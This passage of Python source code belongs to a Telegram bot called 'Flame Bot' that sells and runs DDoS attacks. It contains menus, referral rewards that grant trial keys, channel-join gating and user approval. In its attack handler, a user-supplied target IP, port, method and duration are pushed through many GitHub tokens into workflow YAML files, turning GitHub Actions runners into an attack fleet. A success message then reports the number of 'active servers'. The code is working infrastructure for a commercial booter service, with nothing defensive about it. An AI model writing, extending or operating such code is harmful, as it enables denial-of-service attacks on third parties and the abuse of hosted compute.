        [KeyboardButton(bold("« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮"))]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_token_management_keyboard():
    """Token management keyboard"""
    keyboard = [
        [KeyboardButton(bold("➕ 𝐀𝐝𝐝 𝐓𝐨𝐤𝐞𝐧")), KeyboardButton(bold("📋 𝐋𝐢𝐬𝐭 𝐓𝐨𝐤𝐞𝐧𝐬"))],
        [KeyboardButton(bold("🗑️ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐓𝐨𝐤𝐞𝐧")), KeyboardButton(bold("🧹 𝐑𝐞𝐦𝐨𝐯𝐞 𝐄𝐱𝐩𝐢𝐫𝐞𝐝"))],
        [KeyboardButton(bold("« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮"))]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_price_management_keyboard():
    """Price management keyboard"""
    keyboard = [
        [KeyboardButton(bold("👤 𝐔𝐬𝐞𝐫 𝐏𝐫𝐢𝐜𝐞𝐬")), KeyboardButton(bold("💰 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐏𝐫𝐢𝐜𝐞𝐬"))],
        [KeyboardButton(bold("« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮"))]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_free_controls_keyboard():
    """Free user controls keyboard"""
    keyboard = [
        [KeyboardButton(bold("⏱️ 𝐒𝐞𝐭 𝐌𝐚𝐱 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧")), KeyboardButton(bold("🔄 𝐒𝐞𝐭 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧"))],
        [KeyboardButton(bold("📊 𝐒𝐞𝐭 𝐃𝐚𝐢𝐥𝐲 𝐋𝐢𝐦𝐢𝐭")), KeyboardButton(bold("👥 𝐒𝐞𝐭 𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃"))],
        [KeyboardButton(bold("💬 𝐓𝐨𝐠𝐠𝐥𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤")), KeyboardButton(bold("📊 𝐅𝐫𝐞𝐞 𝐒𝐭𝐚𝐭𝐬"))],
        [KeyboardButton(bold("« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮"))]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_link_settings_keyboard():
    """Link settings keyboard - FIXED to match the handlers"""
    keyboard = [
        [KeyboardButton(bold("🔒 𝐒𝐞𝐭 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐋𝐢𝐧𝐤")), KeyboardButton(bold("🌍 𝐒𝐞𝐭 𝐏𝐮𝐛𝐥𝐢𝐜 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐋𝐢𝐧𝐤"))],
        [KeyboardButton(bold("👥 𝐒𝐞𝐭 𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩 𝐋𝐢𝐧𝐤")), KeyboardButton(bold("🆔 𝐒𝐞𝐭 𝐅𝐫𝐞𝐞 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃"))],
        [KeyboardButton(bold("✅ 𝐓𝐞𝐬𝐭 𝐀𝐥𝐥 𝐋𝐢𝐧𝐤𝐬")), KeyboardButton(bold("📊 𝐕𝐢𝐞𝐰 𝐋𝐢𝐧𝐤𝐬"))],
        [KeyboardButton(bold("« 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮"))]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_cancel_keyboard():
    """Cancel keyboard"""
    keyboard = [[KeyboardButton(bold("❌ 𝐂𝐚𝐧𝐜𝐞𝐥"))]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ==================== START COMMAND HANDLER ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if args and args[0].isdigit():
        referrer_id = int(args[0])
        if referrer_id != user_id:
            await handle_referral(update, context, referrer_id, user_id)
            return

    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            f"🔧 {bold('𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄 𝐌𝐎𝐃𝐄')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
        return

    user_id_str = str(user_id)
    if user_id_str in user_server:
        await show_main_menu(update, user_id)
        return

    not_joined = await check_channel_membership(user_id, context)
    
    if not_joined:
        keyboard = []
        for channel in not_joined:
            if channel["type"] == "private":
                button_text = f"🔒 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                keyboard.append([InlineKeyboardButton(button_text, url=channel["invite_link"])])
            else:
                button_text = f"🌍 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                keyboard.append([InlineKeyboardButton(button_text, url=channel["link"])])
        
        keyboard.append([InlineKeyboardButton(bold("✅ 𝐈'𝐯𝐞 𝐉𝐨𝐢𝐧𝐞𝐝"), callback_data="check_channels")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"📢 {bold('𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒 𝐓𝐎 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐣𝐨𝐢𝐧 𝐭𝐡𝐞 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬:')}\n\n"
            f"{bold('𝐀𝐟𝐭𝐞𝐫 𝐣𝐨𝐢𝐧𝐢𝐧𝐠, 𝐜𝐥𝐢𝐜𝐤')} ✅ {bold('𝐈𝐯𝐞 𝐉𝐨𝐢𝐧𝐞𝐝')}",
            reply_markup=reply_markup
        )
        return

    await update.message.reply_text(
        f"🔥 {bold('𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐅𝐋𝐀𝐌𝐄 𝐁𝐎𝐓')} 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{bold('𝐂𝐇𝐎𝐎𝐒𝐄 𝐀𝐍𝐘 𝐎𝐅 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑𝐒 𝐁𝐄𝐋𝐎𝐖')}\n"
        f"{bold('𝐅𝐑𝐎𝐌 𝐖𝐇𝐈𝐂𝐇 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐁𝐎𝐔𝐆𝐇𝐓')}\n\n"
        f"🔥 {bold('𝐅𝐋𝐀𝐌𝐄 𝐒𝐄𝐑𝐕𝐄𝐑')} - {bold('𝐅𝐨𝐫 𝐅𝐥𝐚𝐦𝐞 𝐁𝐮𝐲𝐞𝐫𝐬')}\n"
        f"👤 {bold('𝐓𝐀𝐍𝐌𝐀𝐘 𝐒𝐄𝐑𝐕𝐄𝐑')} - {bold('𝐅𝐨𝐫 𝐓𝐚𝐧𝐦𝐚𝐲 𝐁𝐮𝐲𝐞𝐫𝐬')}\n"
        f"💎 {bold('𝐍𝐄𝐎 𝐒𝐄𝐑𝐕𝐄𝐑')} - {bold('𝐅𝐨𝐫 𝐍𝐞𝐨 𝐁𝐮𝐲𝐞𝐫𝐬')}\n"
        f"🆓 {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑')} - {bold('𝐅𝐨𝐫 𝐅𝐫𝐞𝐞 𝐓𝐫𝐢𝐚𝐥')}\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=get_server_selection_keyboard()
    )

async def handle_referral(update: Update, context: ContextTypes.DEFAULT_TYPE, referrer_id, new_user_id):
    """Handle referral when someone clicks start with referrer ID"""
    referrer_str = str(referrer_id)
    new_user_str = str(new_user_id)
    
    if referrer_str not in referrals:
        referrals[referrer_str] = {
            "referral_link": f"{links_config['referral']['base_link']}{referrer_id}",
            "referred_users": [],
            "keys_generated": 0,
            "completed_referrals": 0
        }
    
    for ref in referrals[referrer_str]["referred_users"]:
        if ref["user_id"] == new_user_str:
            await update.message.reply_text(
                f"👋 {bold('𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐅𝐋𝐀𝐌𝐄 𝐁𝐎𝐓')}!\n\n"
                f"{bold('𝐘𝐨𝐮 𝐰𝐞𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐫𝐞𝐟𝐞𝐫𝐫𝐞𝐝 𝐛𝐲 𝐬𝐨𝐦𝐞𝐨𝐧𝐞.')}"
            )
            return
    
    not_joined = await check_channel_membership(new_user_id, context)
    
    if not_joined:
        referrals[referrer_str]["referred_users"].append({
            "user_id": new_user_str,
            "joined": False,
            "joined_date": None,
            "completed_channels": False
        })
        save_referrals(referrals)
        
        keyboard = []
        for channel in not_joined:
            if channel["type"] == "private":
                button_text = f"🔒 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                keyboard.append([InlineKeyboardButton(button_text, url=channel["invite_link"])])
            else:
                button_text = f"🌍 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                keyboard.append([InlineKeyboardButton(button_text, url=channel["link"])])
        
        keyboard.append([InlineKeyboardButton(bold("✅ 𝐈'𝐯𝐞 𝐉𝐨𝐢𝐧𝐞𝐝"), callback_data=f"referral_check_{referrer_id}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"📢 {bold('𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒 𝐓𝐎 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐘𝐨𝐮 𝐰𝐞𝐫𝐞 𝐫𝐞𝐟𝐞𝐫𝐫𝐞𝐝 𝐛𝐲 𝐚 𝐟𝐫𝐢𝐞𝐧𝐝!')}\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐣𝐨𝐢𝐧 𝐭𝐡𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬 𝐭𝐨 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐭𝐡𝐞 𝐫𝐞𝐟𝐞𝐫𝐫𝐚𝐥.')}",
            reply_markup=reply_markup
        )
    else:
        referrals[referrer_str]["referred_users"].append({
            "user_id": new_user_str,
            "joined": True,
            "joined_date": time.time(),
            "completed_channels": True
        })
        
        completed = [u for u in referrals[referrer_str]["referred_users"] if u["completed_channels"]]
        
        if len(completed) >= 2 and (len(completed) - referrals[referrer_str]["keys_generated"]) >= 2:
            key = generate_trial_key(2, f"referral_{referrer_id}")
            referrals[referrer_str]["keys_generated"] += 2
            referrals[referrer_str]["completed_referrals"] += 1
            save_referrals(referrals)
            
            try:
                await context.bot.send_message(
                    chat_id=referrer_id,
                    text=f"🎉 {bold('𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐔𝐋𝐀𝐓𝐈𝐎𝐍𝐒')}!\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"{bold('𝐘𝐨𝐮 have 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝟐 𝐫𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬')}!\n\n"
                         f"🔑 {bold('𝐘𝐎𝐔𝐑 𝟐-𝐇𝐎𝐔𝐑 𝐓𝐑𝐈𝐀𝐋 𝐊𝐄𝐘')}:\n"
                         f"`{key}`\n\n"
                         f"⚠️ {bold('𝐈𝐌𝐏𝐎𝐑𝐓𝐀𝐍𝐓')}:\n"
                         f"{bold('𝐉𝐨𝐢𝐧 𝐭𝐡𝐞 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐭𝐨 𝐚𝐭𝐭𝐚𝐜𝐤')}!\n"
                         f"{links_config['free_group']['link']}\n\n"
                         f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                )
            except:
                pass
        
        save_referrals(referrals)
        
        await update.message.reply_text(
            f"👋 {bold('𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐅𝐋𝐀𝐌𝐄 𝐁𝐎𝐓')}!\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐘𝐨𝐮 𝐰𝐞𝐫𝐞 𝐫𝐞𝐟𝐞𝐫𝐫𝐞𝐝 𝐛𝐲 𝐚 𝐟𝐫𝐢𝐞𝐧𝐝')}!\n\n"
            f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐥𝐞𝐜𝐭 𝐚 𝐬𝐞𝐫𝐯𝐞𝐫 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞')}."
        )

# ==================== BUTTON CALLBACK HANDLER (FIXED) ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    if data == "check_channels":
        not_joined = await check_channel_membership(user_id, context)
        
        if not_joined:
            keyboard = []
            for channel in not_joined:
                if channel["type"] == "private":
                    button_text = f"🔒 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                    keyboard.append([InlineKeyboardButton(button_text, url=channel["invite_link"])])
                else:
                    button_text = f"🌍 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                    keyboard.append([InlineKeyboardButton(button_text, url=channel["link"])])
            
            keyboard.append([InlineKeyboardButton(bold("✅ 𝐈𝐯𝐞 𝐉𝐨𝐢𝐧𝐞𝐝"), callback_data="check_channels")])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.message.edit_text(
                f"📢 {bold('𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒 𝐓𝐎 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐄')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐍𝐎𝐓 𝐣𝐨𝐢𝐧𝐞𝐝 𝐚𝐥𝐥 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬')}!\n\n"
                f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐣𝐨𝐢𝐧 𝐚𝐧𝐝 𝐜𝐥𝐢𝐜𝐤')} ✅ {bold('𝐈𝐯𝐞 𝐉𝐨𝐢𝐧𝐞𝐝')}",
                reply_markup=reply_markup
            )
        else:
            await query.message.edit_text(
                f"✅ {bold('𝐓𝐇𝐀𝐍𝐊 𝐘𝐎𝐔 𝐅𝐎𝐑 𝐉𝐎𝐈𝐍𝐈𝐍𝐆')}!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐍𝐨𝐰 𝐩𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐥𝐞𝐜𝐭 𝐲𝐨𝐮𝐫 𝐬𝐞𝐫𝐯𝐞𝐫')}:\n\n"
                f"🔥 {bold('𝐅𝐋𝐀𝐌𝐄 𝐒𝐄𝐑𝐕𝐄𝐑')}\n"
                f"👤 {bold('𝐓𝐀𝐍𝐌𝐀𝐘 𝐒𝐄𝐑𝐕𝐄𝐑')}\n"
                f"💎 {bold('𝐍𝐄𝐎 𝐒𝐄𝐑𝐕𝐄𝐑')}\n"
                f"🆓 {bold('𝐅𝐑𝐄𝐄 𝐔𝐒𝐄𝐑')}"
            )
            await query.message.reply_text(
                f"{bold('𝐔𝐬𝐞 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐬𝐞𝐥𝐞𝐜𝐭')}:",
                reply_markup=get_server_selection_keyboard()
            )

    elif data.startswith("referral_check_"):
        referrer_id = int(data.split("_")[2])
        
        not_joined = await check_channel_membership(user_id, context)
        
        if not_joined:
            keyboard = []
            for channel in not_joined:
                if channel["type"] == "private":
                    button_text = f"🔒 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                    keyboard.append([InlineKeyboardButton(button_text, url=channel["invite_link"])])
                else:
                    button_text = f"🌍 {bold('𝐉𝐨𝐢𝐧')} {channel['name']}"
                    keyboard.append([InlineKeyboardButton(button_text, url=channel["link"])])
            
            keyboard.append([InlineKeyboardButton(bold("✅ 𝐈𝐯𝐞 𝐉𝐨𝐢𝐧𝐞𝐝"), callback_data=f"referral_check_{referrer_id}")])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.message.edit_text(
                f"📢 {bold('𝐉𝐎𝐈𝐍 𝐎𝐔𝐑 𝐂𝐇𝐀𝐍𝐍𝐄𝐋𝐒')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐘𝐨𝐮 𝐬𝐭𝐢𝐥𝐥 𝐡𝐚𝐯𝐞𝐧𝐭 𝐣𝐨𝐢𝐧𝐞𝐝 𝐚𝐥𝐥 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬')}!",
                reply_markup=reply_markup
            )
        else:
            referrer_str = str(referrer_id)
            if referrer_str in referrals:
                for ref in referrals[referrer_str]["referred_users"]:
                    if ref["user_id"] == str(user_id):
                        ref["joined"] = True
                        ref["joined_date"] = time.time()
                        ref["completed_channels"] = True
                        break
                
                completed = [u for u in referrals[referrer_str]["referred_users"] if u["completed_channels"]]
                
                if len(completed) >= 2 and (len(completed) - referrals[referrer_str]["keys_generated"]) >= 2:
                    key = generate_trial_key(2, f"referral_{referrer_id}")
                    referrals[referrer_str]["keys_generated"] += 2
                    referrals[referrer_str]["completed_referrals"] += 1
                    
                    try:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"🎉 {bold('𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐔𝐋𝐀𝐓𝐈𝐎𝐍𝐒')}!\n"
                                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                 f"{bold('𝐘𝐨𝐮𝐯𝐞 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝟐 𝐫𝐞𝐟𝐞𝐫𝐫𝐚𝐥𝐬')}!\n\n"
                                 f"🔑 {bold('𝐘𝐎𝐔𝐑 𝟐-𝐇𝐎𝐔𝐑 𝐓𝐑𝐈𝐀𝐋 𝐊𝐄𝐘')}:\n"
                                 f"`{key}`\n\n"
                                 f"⚠️ {bold('𝐈𝐌𝐏𝐎𝐑𝐓𝐀𝐍𝐓')}:\n"
                                 f"{bold('𝐉𝐨𝐢𝐧 𝐭𝐡𝐞 𝐅𝐑𝐄𝐄 𝐆𝐑𝐎𝐔𝐏 𝐭𝐨 𝐚𝐭𝐭𝐚𝐜𝐤')}!\n"
                                 f"{links_config['free_group']['link']}\n\n"
                                 f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
                        )
                    except:
                        pass
                
                save_referrals(referrals)
            
            await query.message.edit_text(
                f"✅ {bold('𝐓𝐇𝐀𝐍𝐊 𝐘𝐎𝐔')}!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{bold('𝐑𝐞𝐟𝐞𝐫𝐫𝐚𝐥 𝐜𝐨𝐧𝐟𝐢𝐫𝐦𝐞𝐝')}!\n\n"
                f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐥𝐞𝐜𝐭 𝐚 𝐬𝐞𝐫𝐯𝐞𝐫')}:"
            )
            await query.message.reply_text(
                f"{bold('𝐂𝐡𝐨𝐨𝐬𝐞 𝐲𝐨𝐮𝐫 𝐬𝐞𝐫𝐯𝐞𝐫')}:",
                reply_markup=get_server_selection_keyboard()
            )

    elif data == "cancel_operation":
        if user_id in temp_data:
            del temp_data[user_id]
        reply_markup = get_main_keyboard(user_id)
        await query.message.reply_text(f"❌ {bold('𝐎𝐏𝐄𝐑𝐀𝐓𝐈𝐎𝐍 𝐂𝐀𝐍𝐂𝐄𝐋𝐋𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}", reply_markup=reply_markup)
        await query.message.delete()

    elif data.startswith("trial_"):
        hours = int(data.split("_")[1])
        key = generate_trial_key(hours)

        await query.message.edit_text(
            f"🔑 {bold('𝐓𝐑𝐈𝐀𝐋 𝐊𝐄𝐘 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐊𝐞𝐲')}: `{key}`\n"
            f"{bold('𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}: {bold(str(hours))} {bold('𝐡𝐨𝐮𝐫𝐬')}\n"
            f"{bold('𝐄𝐱𝐩𝐢𝐫𝐞𝐬')}: {bold('𝐢𝐧')} {bold(str(hours))} {bold('𝐡𝐨𝐮𝐫𝐬')}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )

    elif data.startswith("cooldown_"):
        cooldown = int(data.split("_")[1])

        global COOLDOWN_DURATION
        COOLDOWN_DURATION = cooldown
        save_cooldown(cooldown)

        await query.message.edit_text(
            f"✓ {bold('𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐔𝐏𝐃𝐀𝐓𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐍𝐞𝐰 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {bold(str(COOLDOWN_DURATION))} {bold('𝐬𝐞𝐜𝐨𝐧𝐝𝐬')}\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )

    elif data.startswith("attack_time_"):
        attack_duration = int(data.split("_")[2])

        if user_id not in temp_data:
            await query.message.edit_text(f"❌ {bold('𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐄𝐗𝐏𝐈𝐑𝐄𝐃')}\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐭𝐚𝐫𝐭 𝐚𝐠𝐚𝐢𝐧')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            return

        ip = temp_data[user_id]["ip"]
        port = temp_data[user_id]["port"]
        method = temp_data[user_id]["method"]
        server = temp_data[user_id].get("server", "UNKNOWN")

        del temp_data[user_id]

        await query.message.edit_text(f"🔄 {bold('𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊')}...\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")

        start_attack(ip, port, attack_duration, user_id, method, server)

        success_count = 0
        suspended_count = 0
        fail_count = 0
        total_servers = len(github_tokens)
        threads = []
        results = []

        def update_single_token(token_data):
            try:
                status = check_token_status(token_data)
                if status == "suspended":
                    results.append((token_data['username'], False, "suspended"))
                else:
                    result = update_yml_file(
                        token_data['token'],
                        token_data['repo'],
                        ip, port, attack_duration, method
                    )
                    if result:
                        results.append((token_data['username'], True, "active"))
                    else:
                        results.append((token_data['username'], False, "failed"))
            except Exception as e:
                results.append((token_data['username'], False, "error"))

        for token_data in github_tokens:
            thread = threading.Thread(target=update_single_token, args=(token_data,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        for username, success, status in results:
            if success:
                success_count += 1
            elif status == "suspended":
                suspended_count += 1
            else:
                fail_count += 1

        user_id_str = str(user_id)

        feedback_required = False
        if server == "FREE":
            feedback_required = True
            user_feedback_status[user_id_str] = {"pending": True, "attack_time": time.time()}
        else:
            attacks_since_feedback = user_attack_counters.get(user_id_str, 0)
            if attacks_since_feedback % 3 == 0:
                feedback_required = True
                user_feedback_status[user_id_str] = {"pending": True, "attack_time": time.time()}

        reply_markup = get_main_keyboard(user_id)
        
        attack_message = (
            f"🚀 {bold('𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃')} 🚀\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 {bold('𝐓𝐚𝐫𝐠𝐞𝐭')}: {ip}:{port}\n"
            f"⏰ {bold('𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}: {bold(str(attack_duration))} {bold('𝐬𝐞𝐜𝐨𝐧𝐝𝐬')}\n"
            f"🧠 {bold('𝐌𝐄𝐓𝐇𝐎𝐃')}: {method}\n"
            f"🖥️ {bold('𝐒𝐞𝐫𝐯𝐞𝐫')}: {server}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ {bold('𝐀𝐜𝐭𝐢𝐯𝐞 𝐬𝐞𝐫𝐯𝐞𝐫𝐬')}: {success_count}/{total_servers}\n"
            f"⏳ {bold('𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧')}: {bold(str(COOLDOWN_DURATION))} {bold('𝐬')}\n\n"
        )

        if feedback_required:
            attack_message += (
                f"⚠️ {bold('𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃')}\n"
                f"{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐮𝐛𝐦𝐢𝐭 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤')}\n"
            )

        attack_message += f"\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"

        await query.message.edit_text(attack_message)
        await query.message.reply_text(f"{bold('𝐔𝐬𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞')}:", reply_markup=reply_markup)

        def monitor_attack_completion():
            time.sleep(attack_duration)
            finish_attack()
            logger.info(f"Attack completed automatically after {attack_duration} seconds")

        monitor_thread = threading.Thread(target=monitor_attack_completion)
        monitor_thread.daemon = True
        monitor_thread.start()

    elif data.startswith("days_"):
        days = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text(f"❌ {bold('𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐄𝐗𝐏𝐈𝐑𝐄𝐃')}\n{bold('𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐭𝐚𝐫𝐭 𝐚𝐠𝐚𝐢𝐧')}.\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
            return

        new_user_id = temp_data[user_id]["new_user_id"]
        added_by = temp_data[user_id].get("added_by", user_id)
        del temp_data[user_id]

        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)

        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 24 * 60 * 60)

        approved_users[str(new_user_id)] = {
            "username": f"user_{new_user_id}",
            "added_by": added_by,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)

        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"✓ {bold('𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃')}!\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"{bold('𝐘𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐟𝐨𝐫')} {bold(str(days) if days > 0 else '𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄')} {bold('𝐝𝐚𝐲𝐬' if days > 1 else '𝐝𝐚𝐲' if days == 1 else '')}.\n\n"
                     f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await query.message.edit_text(
            f"✓ {bold('𝐔𝐒𝐄𝐑 𝐀𝐃𝐃𝐄𝐃')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{bold('𝐔𝐬𝐞𝐫 𝐈𝐃')}: `{new_user_id}`\n"
            f"{bold('𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧')}: {bold(str(days) if days > 0 else '𝐋𝐢𝐟𝐞𝐭𝐢𝐦𝐞')}\n"
            f"{bold('𝐀𝐝𝐝𝐞𝐝 𝐛𝐲')}: `{added_by}`\n\n"
            f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}"
        )
